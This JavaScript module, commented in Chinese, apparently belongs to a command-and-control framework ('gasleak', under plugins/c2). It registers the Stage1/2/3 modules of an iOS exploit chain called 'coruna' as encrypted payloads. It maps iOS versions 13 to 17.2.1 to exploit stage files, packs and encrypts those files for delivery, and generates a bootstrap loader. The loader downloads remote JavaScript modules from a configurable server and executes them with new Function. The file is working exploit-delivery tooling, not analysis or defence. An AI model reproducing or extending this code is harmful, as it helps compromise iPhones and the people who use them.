/**
 * chain-coruna —— 把 coruna 的 Stage1/2/3 注册为 gasleak 的 Payload 条目
 *
 * 【已核实】coruna 的模块体系与 gasleak 入口 JS **完全同源**：
 *   - 两者都用 globalThis.moduleManager / globalThis.obChTK 别名
 *   - 模块 ID 一致：
 *       57620206d62079baad0e57e6d9ec93120c0f5247  = utility_module（类型转换原语）
 *       14669ca3b1519ba2a8f40be287f646d4d7593eb0  = platform_module（版本/偏移选择）
 *   - 两者都 setSalt("cecd08aa6ff548c2")
 *   - group.html:347-348 与 gasleak 入口 JS 的模块表逐字节对应
 *
 * 因此 coruna **不需要重写装载器**：把 group.html 的 moduleManager 引导段
 * 与两个基础模块一并作为 entries 下发即可，版本相关模块再用 getModuleByURL 拉取。
 *
 * 【已核实】getModuleByURL 的 SHA256+salt 混淆被**显式注释掉**了：
 *     //I = SHA256(moduleCache.p + M).substring(0, 40);
 *     I = moduleId; // de-randomize
 * 即模块 ID 直接用作文件名。这意味着 entries[].name 可复用 coruna 现有 SHA1，
 * **无需**计算带 salt 的哈希。这是「待确认项 1」的最终答案。
 *
 * coruna 全部出现的 4 个模块 ID：
 *  57620206d62079baad0e57e6d9ec93120c0f5247  utility
 *  14669ca3b1519ba2a8f40be287f646d4d7593eb0  platform
 *  ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8  （Stage2_15.0_16.2 内引用）
 *  b5135768e043d1b362977b8ba9bff678b9946bcb  （Stage3_VariantB 内引用）
 */

import path from 'node:path';
import crypto from 'node:crypto';
import { readFile, mkdir } from 'node:fs/promises';
// ★ I1-C2 修复（承接 I1-C1 的 P1 Finding）：
//   原 `../core/crypto/seven-zip.js` 在**源侧**（build/services/）解析为 build/core/crypto/，
//   但产物落点 plugins/c2/services/ **多一层** ⇒ 会解析到 plugins/c2/core/crypto/（不存在）。
//   改为与同目录 config-builder.js 一致的 `../../../core/crypto/`，
//   指向产物内真实位置 src_restored/core/crypto/seven-zip.js。
//   ★ 取舍：本行改动使本文件哈希不再等于源侧（登记于 L004），
//     但**不改任何逻辑**；契约 C-5 的哈希锁定针对 chain-router.js（本文件未动其内容语义）。
import { PayloadCrypto } from '../../../core/crypto/seven-zip.js';
import { packModule, inferPackMode } from './module-packer.js';

/**
 * coruna 的全部**远程加载模块**（= group.html 中 getModuleByURL 的参数 = 文件名 = entries[].name）
 *
 * 【已核实】group.html:382-615 逐条列出的加载名与其 SHA1 注释，
 * 已全部对照 coruna 目录实际文件确认存在（13/13 命中）。
 *
 * 【重要】ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8 与
 *        b5135768e043d1b362977b8ba9bff678b9946bcb
 * **不是独立文件** —— 它们通过 `moduleManager.evalCode(id, function(){...})`
 * **内联注册**（定义体就在注册处的闭包里）：
 *   Stage2_15.0_16.2_breezy15.js:3    evalCode("ba712ef6...", fn)
 *   Stage2_16.3_16.5.1_seedbell.js:26 evalCode("ba712ef6...", fn)
 *   Stage3_VariantB.js:34             evalCode("ba712ef6...", fn)
 *   Stage3_VariantB.js:531            evalCode("b5135768...", fn)
 * 因此它们**无需、也不能**作为 entries 下发 —— 随宿主模块一起到达。
 */

/** 基础模块：随 entries 下发，必须最先可用 */
export const CORUNA_BASE_MODULES = [
  {
    id: '57620206d62079baad0e57e6d9ec93120c0f5247',
    name: 'coruna_utility',
    src: 'utility_module.js',
    sha1: '57620206d62079baad0e57e6d9ec93120c0f5247',
    desc: '类型转换原语：Int64 / double<->uint32 / BigInt / LEB128 / LZW',
  },
  {
    id: '14669ca3b1519ba2a8f40be287f646d4d7593eb0',
    name: 'coruna_platform',
    src: 'platform_module.js',
    sha1: '14669ca3b1519ba2a8f40be287f646d4d7593eb0',
    desc: 'iOS 版本探测、偏移表选择、Lockdown/模拟器检测、PAC 标志',
  },
];

/**
 * Stage1 — 按 iOS 版本选择（group.html:500-521，含各文件 SHA1 注释）
 * 「7d8f5bae...」是 Stage1_15.2_15.5_jacurutu 的**哈希文件名别名**（group.html:520-521），
 * 两者内容对应同一阶段，注册时保持原样以兼容 group.html 的加载分支。
 */
export const CORUNA_STAGE1 = [
  { range: [[15, 2], [15, 5]],     src: 'Stage1_15.2_15.5_jacurutu.js',
    sha1: 'ea3da0cfb0a5bdb8c440dd4a963f94cbd39d9e44' },
  { range: [[15, 6], [16, 1, 2]],  src: 'Stage1_15.6_16.1.2_bluebird.js',
    sha1: 'd11d34e4d96a4c0539e441d861c5783db8a1c6e9' },
  { range: [[16, 2], [16, 5, 1]],  src: 'Stage1_16.2_16.5.1_terrorbird.js',
    sha1: '57cb8c6431c5efe203f5bfa5a1a83f705cb350b8' },
  { range: [[16, 6], [17, 2, 1]],  src: 'Stage1_16.6_17.2.1_cassowary.js',
    sha1: 'e3b6ba10484875fabaed84076774a54b87752b8a' },
];

/** Stage1 哈希别名（group.html:521 的加载分支需要） */
export const CORUNA_STAGE1_ALIASES = [
  { src: '7d8f5bae97f37aa318bccd652bf0c1dc38fd8396.js',
    name: '7d8f5bae97f37aa318bccd652bf0c1dc38fd8396',
    desc: 'Stage1_15.2_15.5 的哈希别名' },
];

/**
 * Stage2 — 由运行时偏移标志决定，需全部注册
 * （group.html:382-415，每条附 SHA1 注释）
 */
export const CORUNA_STAGE2 = [
  { src: 'Stage2_16.6_17.2.1_seedbell_pre.js',
    sha1: '477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba', desc: 'seedbell 前置' },
  { src: 'Stage2_17.0_17.2.1_seedbell.js',
    sha1: '29b874a9a6cc9fa9d487b31144e130827bf941bb', desc: 'iOS 17.0–17.2.1 主' },
  { src: 'Stage2_16.6_16.7.12_seedbell.js',
    sha1: '9db8a84aa7caa5665f522873f49293e8eebccd5c', desc: 'iOS 16.6–16.7.x 备选' },
  { src: 'Stage2_16.3_16.5.1_seedbell.js',
    sha1: '171a7da1934de9e0efb9c1645f4575f88e482873', desc: 'iOS 16.3–16.5.1' },
  { src: 'Stage2_15.0_16.2_breezy15.js',
    sha1: '91b278ddb2aec817b10c1535e0963da74f9b8eeb', desc: 'iOS 15.0–16.2' },
  { src: 'Stage2_13.0_14.x_breezy.js',
    sha1: 'b586c88246144bc7975ad4e27ec6d62716bf34ea', desc: 'iOS 13.0–14.x' },
];

/** Stage3 — 两个变体（group.html:606-615，无 SHA1 注释） */
export const CORUNA_STAGE3 = [
  { src: 'Stage3_VariantA.js', desc: '变体 A' },
  { src: 'Stage3_VariantB.js', desc: '变体 B' },
];

/** 内联注册模块（evalCode）—— 仅记录，不作为 entries 下发 */
export const CORUNA_INLINE_MODULES = [
  { id: 'ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8',
    definedIn: ['Stage2_15.0_16.2_breezy15.js:3',
                'Stage2_16.3_16.5.1_seedbell.js:26',
                'Stage3_VariantB.js:34'] },
  { id: 'b5135768e043d1b362977b8ba9bff678b9946bcb',
    definedIn: ['Stage3_VariantB.js:531'] },
];

/** 依据 iOS 版本挑 Stage1 文件 */
export function pickStage1(version) {
  const cmp = (a, b) => {
    const n = Math.max(a.length, b.length);
    for (let i = 0; i < n; i++) {
      const x = a[i] || 0, y = b[i] || 0;
      if (x !== y) return x < y ? -1 : 1;
    }
    return 0;
  };
  for (const s of CORUNA_STAGE1) {
    if (cmp(version, s.range[0]) >= 0 && cmp(version, s.range[1]) <= 0) return s.src;
  }
  return null;
}

/**
 * 计算 coruna 模块的 entries[].name。
 * 已核实：getModuleByURL 用裸 moduleId 作文件名（salthash 被注释掉），
 * 所以这里直接返回原始名字（去扩展名），与现网行为一致。
 */
export function entryNameFor(file) {
  return path.basename(file, '.js');
}

/**
 * 同步 coruna 模块到 storageRoot/payloads。
 *
 * 下发集合 = 基础模块（2）+ Stage1（4，按需裁剪）+ Stage1 别名（1）+ Stage2（6）+ Stage3（2）
 *
 * @param {string} srcDir      coruna 源码目录
 * @param {string} storageRoot gasleak 存储根
 * @param {boolean} allStages  是否注册全部 Stage2/Stage3（否则仅基础 + 全部 Stage1）
 * @param {'auto'|'dylib'|'js-plain'|'js-b64'|'binary'} packMode 封装模式，默认 auto
 * @returns {{records:Array, report:Array}}
 */
export async function syncCorunaPayloads(srcDir, storageRoot, allStages = true, packMode = 'auto') {
  const files = [];

  for (const m of CORUNA_BASE_MODULES) files.push({ file: m.src, name: m.name });
  for (const s of CORUNA_STAGE1) files.push({ file: s.src, name: entryNameFor(s.src) });
  for (const a of CORUNA_STAGE1_ALIASES) files.push({ file: a.src, name: a.name });
  if (allStages) {
    for (const s of CORUNA_STAGE2) files.push({ file: s.src, name: entryNameFor(s.src) });
    for (const s of CORUNA_STAGE3) files.push({ file: s.src, name: entryNameFor(s.src) });
  }

  const out = [];
  const report = [];
  for (const f of files) {
    let raw;
    try {
      raw = await readFile(path.join(srcDir, f.file));
    } catch (err) {
      report.push({ name: f.name, file: f.file, error: err.code || String(err) });
      continue;
    }
    // coruna 模块是明文 JS -> auto 判定为 js-plain
    const mode = packMode === 'auto' ? inferPackMode(raw, f.file) : packMode;

    const encName = `${f.name}.dat`;
    const encPath = path.join(storageRoot, 'payloads', encName);
    const { bytes } = await packModule(mode, raw, encPath, { PayloadCrypto });

    out.push({
      name: f.name,
      bundleId: '',
      type: 'module',
      active: true,
      cold: 0,
      doNotCloseAfterRun: 1,
      sha256: crypto.createHash('sha256').update(raw).digest('hex'),
      size: bytes,
      encryptedPath: `payloads/${encName}`,
      packMode: mode,
      updatedAt: new Date(),
      createdAt: new Date(),
    });
    report.push({ name: f.name, file: f.file, size: bytes, packMode: mode });
  }
  return { records: out, report };
}

/**
 * 自检：确认 group.html 中每条 getModuleByURL 的加载名都有对应文件。
 * @param {Array} report syncCorunaPayloads 的 report
 */
export function corunaSelfCheck(report) {
  const missing = report.filter(r => r.error).map(r => `${r.name}(${r.file}): ${r.error}`);
  return { ok: missing.length === 0, missing };
}

/**
 * 生成 coruna 的 moduleManager 引导段（等同 group.html 的引导代码）。
 * 下发时作为首个 entry 的 prefix 注入，或独立作为 boot.js。
 */
export function buildCorunaBootstrap(baseUrl, salt = 'cecd08aa6ff548c2') {
  return `
;(function(){
  if (globalThis.moduleManager) return;
  let MM = {
    "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
    "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0
  };
  const e = { "$": "", "p": "" };
  function c(M){ if(M in e == !1){ if(M in MM != !0) throw new Error("M in MM != !0"); e[M] = MM[M](); } return e[M] }
  globalThis.moduleManager = {
    hPL3On: this.getModuleByName,
    ZKvD0e: this.getModuleByURL,
    fgPoij: this.evalBase64Module,
    setBaseUrl: function(M){ e.$ = M },
    setSalt:    function(M){ e.p = M },
    getModuleByName: c,
    getModuleByURL: async function(moduleId){
      if (moduleId in e == !1 && moduleId in MM == !1){
        let I = moduleId;   // de-randomize: 不套 SHA256(salt+id)
        const N = await new Promise((resolve, reject) => {
          const D = new XMLHttpRequest();
          const g = new URL((e.$) + (I) + ".js");
          const c2 = Math.random().toString(36).slice(2, 8);
          g.searchParams.set(c2, Math.floor(Math.random()*2));
          D.open("GET", g.toString(), !0);
          D.responseType = "arraybuffer";
          D.onreadystatechange = () => {
            if (D.readyState === XMLHttpRequest.DONE){
              if (200 === D.status){ const M = D.response; (M===null||M==="") ? reject("") : resolve(M) }
              else reject("");
            }
          };
          D.send();
        });
        e[moduleId] = new Function(N)();
      }
      return c(moduleId);
    },
    evalCode: function(M, I){ M in e == !1 && (e[M] = I()) },
    evalBase64Module: function(M, I){ M in e == !1 && (e[M] = new Function(atob(I))()) }
  };
  globalThis.obChTK = globalThis.moduleManager;   // MARK: alias
  globalThis.moduleManager.setBaseUrl(${JSON.stringify(baseUrl)});
  globalThis.moduleManager.setSalt(${JSON.stringify(salt)});
})();
`.trim();
}
